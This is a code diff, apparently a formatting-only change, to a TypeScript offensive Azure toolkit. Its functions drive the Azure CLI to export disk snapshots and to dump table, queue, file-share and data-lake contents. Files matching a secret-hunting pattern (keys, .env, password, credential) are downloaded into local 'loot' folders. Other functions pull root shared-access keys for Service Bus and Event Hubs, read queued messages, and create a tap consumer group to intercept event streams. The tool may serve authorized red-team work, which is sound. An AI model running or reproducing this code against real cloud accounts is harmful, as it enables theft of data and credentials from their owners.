@@ -233,7 +233,12 @@ export async function diskSnapshot(args: string[], timeout: number): Promise<Hoo
 
   if (action === "list") {
     const disks = await az(
-      ["disk", "list", "--query", "[].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType,state:diskState,encryption:encryption.type}"],
+      [
+        "disk",
+        "list",
+        "--query",
+        "[].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType,state:diskState,encryption:encryption.type}",
+      ],
       sub,
       timeout,
     )
@@ -241,19 +246,27 @@ export async function diskSnapshot(args: string[], timeout: number): Promise<Hoo
       const diskList = tryJson(disks.stdout) || []
       output.push(`[+] Managed disks: ${diskList.length}`)
       for (const d of diskList) {
-        output.push(`    ${d.name} (${d.size}GB, ${d.os || "data"}) — state: ${d.state}, rg: ${d.rg}, encryption: ${d.encryption || "none"}`)
+        output.push(
+          `    ${d.name} (${d.size}GB, ${d.os || "data"}) — state: ${d.state}, rg: ${d.rg}, encryption: ${d.encryption || "none"}`,
+        )
       }
     }
 
     const snapshots = await az(
-      ["snapshot", "list", "--query", "[].{name:name,rg:resourceGroup,size:diskSizeGb,source:creationData.sourceResourceId}"],
+      [
+        "snapshot",
+        "list",
+        "--query",
+        "[].{name:name,rg:resourceGroup,size:diskSizeGb,source:creationData.sourceResourceId}",
+      ],
       sub,
       timeout,
     )
     if (snapshots.exitCode === 0) {
       const snapList = tryJson(snapshots.stdout) || []
       output.push(`\n[+] Existing snapshots: ${snapList.length}`)
-      for (const s of snapList) output.push(`    ${s.name} (${s.size}GB) — source: ${s.source?.split("/").pop() || "unknown"}, rg: ${s.rg}`)
+      for (const s of snapList)
+        output.push(`    ${s.name} (${s.size}GB) — source: ${s.source?.split("/").pop() || "unknown"}, rg: ${s.rg}`)
     }
   }
 
@@ -287,7 +300,18 @@ export async function diskSnapshot(args: string[], timeout: number): Promise<Hoo
 
   if (action === "export" && snapshotName && rg) {
     const grant = await az(
-      ["snapshot", "grant-access", "--name", snapshotName, "--resource-group", rg, "--duration-in-seconds", "3600", "--access-level", "Read"],
+      [
+        "snapshot",
+        "grant-access",
+        "--name",
+        snapshotName,
+        "--resource-group",
+        rg,
+        "--duration-in-seconds",
+        "3600",
+        "--access-level",
+        "Read",
+      ],
       sub,
       timeout,
     )
@@ -362,7 +386,20 @@ export async function tableQueueDump(args: string[], timeout: number): Promise<H
     if (tableName) {
       const query = await run(
         "az",
-        ["storage", "entity", "query", "--table-name", tableName, "--account-name", accountName, ...keyArgs, "--top", maxItems, "-o", "json"],
+        [
+          "storage",
+          "entity",
+          "query",
+          "--table-name",
+          tableName,
+          "--account-name",
+          accountName,
+          ...keyArgs,
+          "--top",
+          maxItems,
+          "-o",
+          "json",
+        ],
         timeout,
       )
       if (query.exitCode === 0) {
@@ -400,7 +437,20 @@ export async function tableQueueDump(args: string[], timeout: number): Promise<H
     if (queueName) {
       const peek = await run(
         "az",
-        ["storage", "message", "peek", "--queue-name", queueName, "--account-name", accountName, ...keyArgs, "--num-messages", "10", "-o", "json"],
+        [
+          "storage",
+          "message",
+          "peek",
+          "--queue-name",
+          queueName,
+          "--account-name",
+          accountName,
+          ...keyArgs,
+          "--num-messages",
+          "10",
+          "-o",
+          "json",
+        ],
         timeout,
       )
       if (peek.exitCode === 0) {
@@ -436,7 +486,9 @@ export async function fileShareDump(args: string[], timeout: number): Promise<Ho
   const shareName = argVal(args, "--share-name")
   const dir = argVal(args, "--directory") || ""
   const download = hasFlag(args, "--download")
-  const pattern = argVal(args, "--pattern") || "\\.(env|pem|key|p12|pfx|conf|config|json|xml|sql|bak|ps1|sh)$|password|secret|credential"
+  const pattern =
+    argVal(args, "--pattern") ||
+    "\\.(env|pem|key|p12|pfx|conf|config|json|xml|sql|bak|ps1|sh)$|password|secret|credential"
   const findings: Finding[] = []
   const output: string[] = ["[*] Azure File Share enumeration...\n"]
 
@@ -448,11 +500,7 @@ export async function fileShareDump(args: string[], timeout: number): Promise<Ho
   }
 
   if (!accountName) {
-    const accts = await az(
-      ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}"],
-      sub,
-      timeout,
-    )
+    const accts = await az(["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
     if (accts.exitCode === 0) {
       const list = tryJson(accts.stdout) || []
       output.push(`[+] Storage accounts: ${list.length}`)
@@ -486,7 +534,19 @@ export async function fileShareDump(args: string[], timeout: number): Promise<Ho
   const dirArgs = dir ? ["--path", dir] : []
   const files = await run(
     "az",
-    ["storage", "file", "list", "--share-name", targetShare, "--account-name", accountName, ...keyArgs, ...dirArgs, "-o", "json"],
+    [
+      "storage",
+      "file",
+      "list",
+      "--share-name",
+      targetShare,
+      "--account-name",
+      accountName,
+      ...keyArgs,
+      ...dirArgs,
+      "-o",
+      "json",
+    ],
     timeout,
   )
   if (files.exitCode === 0) {
@@ -518,7 +578,21 @@ export async function fileShareDump(args: string[], timeout: number): Promise<Ho
         for (const s of sensitive.slice(0, 5)) {
           const dl = await run(
             "az",
-            ["storage", "file", "download", "--share-name", targetShare, "--path", s, "--dest", `./fileshare_loot/${s}`, "--account-name", accountName, ...keyArgs, "--no-progress"],
+            [
+              "storage",
+              "file",
+              "download",
+              "--share-name",
+              targetShare,
+              "--path",
+              s,
+              "--dest",
+              `./fileshare_loot/${s}`,
+              "--account-name",
+              accountName,
+              ...keyArgs,
+              "--no-progress",
+            ],
             timeout,
           )
           output.push(dl.exitCode === 0 ? `    Downloaded: ${s}` : `    Failed: ${s}`)
@@ -549,7 +623,13 @@ export async function dataLakeDump(args: string[], timeout: number): Promise<Hoo
 
   if (!accountName) {
     const accts = await az(
-      ["storage", "account", "list", "--query", "[?kind=='StorageV2' || kind=='BlobStorage'].{name:name,rg:resourceGroup,hns:isHnsEnabled}"],
+      [
+        "storage",
+        "account",
+        "list",
+        "--query",
+        "[?kind=='StorageV2' || kind=='BlobStorage'].{name:name,rg:resourceGroup,hns:isHnsEnabled}",
+      ],
       sub,
       timeout,
     )
@@ -563,12 +643,9 @@ export async function dataLakeDump(args: string[], timeout: number): Promise<Hoo
     return { output: output.join("\n"), findings }
   }
 
-  const filesystems = await run(
-    "az",
-    ["storage", "fs", "list", "--account-name", accountName, "-o", "json"],
-    timeout,
-  )
-  if (filesystems.exitCode !== 0) return { output: `[-] Cannot list filesystems: ${filesystems.stderr.trim()}`, findings }
+  const filesystems = await run("az", ["storage", "fs", "list", "--account-name", accountName, "-o", "json"], timeout)
+  if (filesystems.exitCode !== 0)
+    return { output: `[-] Cannot list filesystems: ${filesystems.stderr.trim()}`, findings }
   const fsList = tryJson(filesystems.stdout) || []
   output.push(`[+] Filesystems in ${accountName}: ${fsList.length}`)
   for (const fs of fsList) output.push(`    ${fs.name}`)
@@ -581,7 +658,20 @@ export async function dataLakeDump(args: string[], timeout: number): Promise<Hoo
 
   const dirList = await run(
     "az",
-    ["storage", "fs", "file", "list", "--file-system", targetFs, "--account-name", accountName, "--path", dir, "-o", "json"],
+    [
+      "storage",
+      "fs",
+      "file",
+      "list",
+      "--file-system",
+      targetFs,
+      "--account-name",
+      accountName,
+      "--path",
+      dir,
+      "-o",
+      "json",
+    ],
     timeout,
   )
   if (dirList.exitCode === 0) {
@@ -615,7 +705,21 @@ export async function dataLakeDump(args: string[], timeout: number): Promise<Hoo
         for (const s of sensitive.slice(0, 5)) {
           const dl = await run(
             "az",
-            ["storage", "fs", "file", "download", "--file-system", targetFs, "--path", s, "--destination", `./datalake_loot/${s.split("/").pop()}`, "--account-name", accountName, "--overwrite"],
+            [
+              "storage",
+              "fs",
+              "file",
+              "download",
+              "--file-system",
+              targetFs,
+              "--path",
+              s,
+              "--destination",
+              `./datalake_loot/${s.split("/").pop()}`,
+              "--account-name",
+              accountName,
+              "--overwrite",
+            ],
             timeout,
           )
           output.push(dl.exitCode === 0 ? `    Downloaded: ${s}` : `    Failed: ${s}`)
@@ -661,7 +765,9 @@ export async function serviceBusSniff(args: string[], timeout: number): Promise<
     const queueList = tryJson(queues.stdout) || []
     output.push(`[+] Queues in ${namespace}: ${queueList.length}`)
     for (const q of queueList) {
-      output.push(`    ${q.name} — active: ${q.countDetails?.activeMessageCount || 0}, dead: ${q.countDetails?.deadLetterMessageCount || 0}`)
+      output.push(
+        `    ${q.name} — active: ${q.countDetails?.activeMessageCount || 0}, dead: ${q.countDetails?.deadLetterMessageCount || 0}`,
+      )
     }
   }
 
@@ -677,7 +783,19 @@ export async function serviceBusSniff(args: string[], timeout: number): Promise<
   }
 
   const keys = await az(
-    ["servicebus", "namespace", "authorization-rule", "keys", "list", "--namespace-name", namespace, "--resource-group", rg, "--name", "RootManageSharedAccessKey"],
+    [
+      "servicebus",
+      "namespace",
+      "authorization-rule",
+      "keys",
+      "list",
+      "--namespace-name",
+      namespace,
+      "--resource-group",
+      rg,
+      "--name",
+      "RootManageSharedAccessKey",
+    ],
     sub,
     timeout,
   )
@@ -701,7 +819,20 @@ export async function serviceBusSniff(args: string[], timeout: number): Promise<
 
   if (queueName) {
     const peek = await az(
-      ["servicebus", "queue", "message", "peek", "--queue-name", queueName, "--namespace-name", namespace, "--resource-group", rg, "--max-count", "10"],
+      [
+        "servicebus",
+        "queue",
+        "message",
+        "peek",
+        "--queue-name",
+        queueName,
+        "--namespace-name",
+        namespace,
+        "--resource-group",
+        rg,
+        "--max-count",
+        "10",
+      ],
       sub,
       timeout,
     )
@@ -766,7 +897,18 @@ export async function eventHubTap(args: string[], timeout: number): Promise<Hook
       output.push(`    ${h.name} — partitions: ${h.partitionCount || 0}, retention: ${h.messageRetentionInDays || 0}d`)
 
       const cgs = await az(
-        ["eventhubs", "eventhub", "consumer-group", "list", "--eventhub-name", h.name, "--namespace-name", namespace, "--resource-group", rg],
+        [
+          "eventhubs",
+          "eventhub",
+          "consumer-group",
+          "list",
+          "--eventhub-name",
+          h.name,
+          "--namespace-name",
+          namespace,
+          "--resource-group",
+          rg,
+        ],
         sub,
         timeout,
       )
@@ -778,7 +920,19 @@ export async function eventHubTap(args: string[], timeout: number): Promise<Hook
   }
 
   const keys = await az(
-    ["eventhubs", "namespace", "authorization-rule", "keys", "list", "--namespace-name", namespace, "--resource-group", rg, "--name", "RootManageSharedAccessKey"],
+    [
+      "eventhubs",
+      "namespace",
+      "authorization-rule",
+      "keys",
+      "list",
+      "--namespace-name",
+      namespace,
+      "--resource-group",
+      rg,
+      "--name",
+      "RootManageSharedAccessKey",
+    ],
     sub,
     timeout,
   )
@@ -803,7 +957,20 @@ export async function eventHubTap(args: string[], timeout: number): Promise<Hook
   if (hubName) {
     const cgName = `cs-tap-${hubName}`
     const createCg = await az(
-      ["eventhubs", "eventhub", "consumer-group", "create", "--eventhub-name", hubName, "--namespace-name", namespace, "--resource-group", rg, "--name", cgName],
+      [
+        "eventhubs",
+        "eventhub",
+        "consumer-group",
+        "create",
+        "--eventhub-name",
+        hubName,
+        "--namespace-name",
+        namespace,
+        "--resource-group",
+        rg,
+        "--name",
+        cgName,
+      ],
       sub,
       timeout,
     )
